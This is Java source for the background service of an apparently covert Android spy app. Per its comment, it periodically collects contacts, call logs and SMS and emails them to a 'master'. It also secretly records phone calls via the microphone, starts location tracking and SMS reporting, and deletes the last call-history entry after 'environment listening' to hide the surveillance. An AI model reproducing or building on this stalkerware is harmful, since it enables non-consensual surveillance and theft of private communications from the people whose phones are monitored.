package system.service;

import java.io.File;
import java.lang.reflect.Method;
import java.util.Date;
import java.util.Timer;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.location.LocationUtil;
import system.service.feature.phonecall.PhoneCallCtrl;
import system.service.feature.sms.SmsCtrl;
import system.service.receiver.ScreenStateReceiver;
import system.service.receiver.SmsReceiver;

import com.android.internal.telephony.ITelephony;
import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.DummyActivity;
import com.particle.inspector.common.util.FileCtrl;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;

/**
 * Service schedules a timer to execute the following task:
 *  - When starting the networks and over N days to the previous timing, 
 *    will get all contacts, phone call history and SMS, 
 *    saved as attachments and mail to the master.  
 */
public class BootService extends Service 
{
	private final String LOGTAG = "BootService";
	
	Context context;
	
	private Timer mGetInfoTimer;
	private GetInfoTask mInfoTask;
	private final long mGetInfoDelay  = 10000; // 10 Seconds
	private final long mGetInfoPeriod = 300000; // 300 Seconds
	
	public static LocationUtil locationUtil = null;
	private TelephonyManager telManager;
	private boolean recordStarted = false;
	public static String otherSidePhoneNum = "";
	private static MediaRecorder recorder = new MediaRecorder();
	private static IntentFilter screenStateIntent = null;
	
	private final PhoneStateListener phoneListener = new PhoneStateListener() {
		private static final long MIN_FILE_SIZE = 10240; // 10KB
		private String fileFullPath = "";
		
		@Override
        public void onCallStateChanged(int state, String incomingNumber) {
			
			// Get incoming phone number
			if (incomingNumber != null && incomingNumber.length() > 0) {
				otherSidePhoneNum = incomingNumber;
			}
			
            switch (state) {
            	case TelephonyManager.CALL_STATE_RINGING: { // 1
                		
                	break;
                }
                case TelephonyManager.CALL_STATE_OFFHOOK: { // 2
                	Context context = getApplicationContext();
                	
                	if (!ConfigCtrl.isLegal(context)) return;
                	
                	// Check if reached the recording limit if trial
                	if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachRecordingTimeLimit(context)) {
                		if (!ConfigCtrl.getHasSentRecordingTimesLimitSms(context)) {
                			// Send SMS to warn user
        					String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
        					if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
        						String msg = context.getResources().getString(R.string.msg_recording_times_over_in_trial) + context.getResources().getString(R.string.support_qq);
        						boolean ret = SmsCtrl.sendSms(recvPhoneNum, msg);
        						if (ret) {
        							ConfigCtrl.setHasSentRecordingTimesLimitSms(context, true);
        						}
        					}
                		}
                		return;
                	}
                	
                	if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
            		
            		if (recordStarted) return;
            		
            		// Set audio
            		//setAudio(context);
            		
            		// Phone call recording
            		try {
                           Date startDate = new Date();
                           this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate);
                           recorder.reset();
                           recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                           recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                           recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                           recorder.setOutputFile(fileFullPath);
                           recorder.prepare();
                           recorder.start();
                           recordStarted = true;
                       } catch(Exception ex) {
                           //Log.e(LOGTAG, ex.getMessage());
                       }
                	break;
                }
                case TelephonyManager.CALL_STATE_IDLE: { // 0
                	if (recordStarted) {
        				recorder.stop();
        				recordStarted = false;
        				
        				// If the size is less than 10KB, delete it
        				try {
        					File file = new File(this.fileFullPath);
        					if (file.exists() && file.length() < MIN_FILE_SIZE) {
        						file.delete();
        					} else {
        						// recording count ++ if in trial
        						if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
        							ConfigCtrl.countRecordingTimesInTrial(context); 
        						}
        					}
        					this.fileFullPath = "";
        				} catch (Exception ex) {
        					//
        				}
        			}
                	
                	// ------------------------------------------------------------------------------------------------
    				// Reset IS_ENV_LISTENING flag
    				if (GlobalValues.IS_ENV_LISTENING) {
    					GlobalValues.IS_ENV_LISTENING = false;
    					
    					// Restore ringer mode
    					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
    					audioManager.setRingerMode(GlobalValues.ORIGINAL_RING_MODE);
    					
    					// Mute speaker
    					audioManager.setSpeakerphoneOn(false);
    					
    					// Broadcast intent to let DummyActivity to exit
    					Intent exitIntent = new Intent(DummyActivity.BROADCAST_ACTION_DUMMY_ACTIVITY_EXIT);
    					//Bundle bundle = new Bundle();
    					//bundle.putBoolean("exit", true);
    					//intent.putExtras(bundle);
    					context.sendBroadcast(exitIntent);
    					
    					SysUtils.threadSleep(1000, LOGTAG);
    					
    					// Remove the last phone call history
    					PhoneCallCtrl.removeLastRecord(context);
    				}
                	
                	break;
                }
                default: { }
                
            }
		}
    };

	@Override
	public IBinder onBind(final Intent intent) {
		return null;
	}
	
	@Override
    public void onDestroy() {  
    }
	
	@Override  
    public boolean onUnbind(Intent intent) {  
        return super.onUnbind(intent);  
    }

	@Override
	public void onCreate() {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onCreate();
		
		this.context = getApplicationContext();
		
		mGetInfoTimer = new Timer();
		mInfoTask = new GetInfoTask(context);
	}

	@Override
	public void onStart(final Intent intent, final int startId) {
		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
		super.onStart(intent, startId);
		
		// A special check on the consume date and current date:
		// If the current date is ealier than consume date, stop the trial
		//CheckDate(context, type);
		
		// ------------------------------------------------------------------
		// Initialize global variables
		if (GlobalValues.recipients == null || GlobalValues.recipients.length <= 0) 
			GlobalValues.recipients = getRecipients(context);
		
		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
			GlobalValues.sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
			
		// ------------------------------------------------------------------			
		// Start timers and listeners
		String recvMail = GlobalPrefActivity.getReceiverMail(context);
		if (recvMail.length() > 0) 
		{
			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
			
			if (telManager == null) {
				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
			}
		}
		
		String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		if (recvPhoneNum.length() > 0 && locationUtil == null) 
		{
			locationUtil = new LocationUtil(context);
		}
		
		// Register screen_on intent broadcast receiver
		if (screenStateIntent == null) {
			screenStateIntent = new IntentFilter(Intent.ACTION_SCREEN_ON);
			this.registerReceiver(new ScreenStateReceiver(), screenStateIntent);
		}
	}
	
	/*
	// Prevent me from being cheated when in trial
	private void CheckDate(Context context, LICENSE_TYPE type) 
	{
		if (type != LICENSE_TYPE.TRIAL_LICENSED) return;
		
		boolean beCheated = true;
		
		String consumeDatetimeStr = ConfigCtrl.getConsumedDatetime(context);
		if (consumeDatetimeStr != null && consumeDatetimeStr.length() > 0) {
			Date consumeDatetime = null;
			try {
				consumeDatetime = DatetimeUtil.format.parse(consumeDatetimeStr);
			} catch (Exception ex) {}
			
			if (consumeDatetime != null && consumeDatetime.before(new Date())) {
				beCheated= false;
			}
		}
		
		if (beCheated) {
			ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
		}
	}
	*/
	
	public class IaiaiBinder extends Binder {  
        public BootService getService() {  
            return BootService.this;  
        }  
    }
	
	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
		//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir(); // Now recording files will be saved to internal storage 
		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
		return FileCtrl.getInternalStorageFilesDirStr(context) + fileName;
	}
	
	/*
	private void setAudio(Context context)
	{
		try {
			AudioManager audiomanager = (AudioManager)context.getSystemService("audio"); 
			//int i = audiomanager.getRouting(2); 
			audiomanager.setMode(2); 
			audiomanager.setMicrophoneMute(false); 
			audiomanager.setSpeakerphoneOn(true); 
			int j = audiomanager.getStreamMaxVolume(0); 
			if(j < 0) j = 1; 
			int k = j / 2 + 1; 
			audiomanager.setStreamVolume(0, k, 0); 
			audiomanager.setRouting(2, 11, 15);
		} catch (Exception ex) {}
	}
	*/
	
	private boolean comingNumberIsLegal(Context context, String comingNum) 
	{
		if (GlobalPrefActivity.getRecordAll(context)) return true;
		
		String[] recordingTargetNumbers = GlobalPrefActivity.getRecordTargetNum(context)
											.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.TARGET_NUMBER_BREAKER)
											.split(GlobalPrefActivity.TARGET_NUMBER_BREAKER);
		for (String num : recordingTargetNumbers) {
			if (comingNum.contains(num)) {
				return true;
			}
		}
			
		return false;
	} 
	
	private static String[] getRecipients(Context context)
	{
		String mail = GlobalPrefActivity.getReceiverMail(context);
		String[] mails = mail.split(",");
		if (mails.length > 0) {
			return StrUtils.filterMails(mails);
		} else {
			return null;
		}
	}
	
}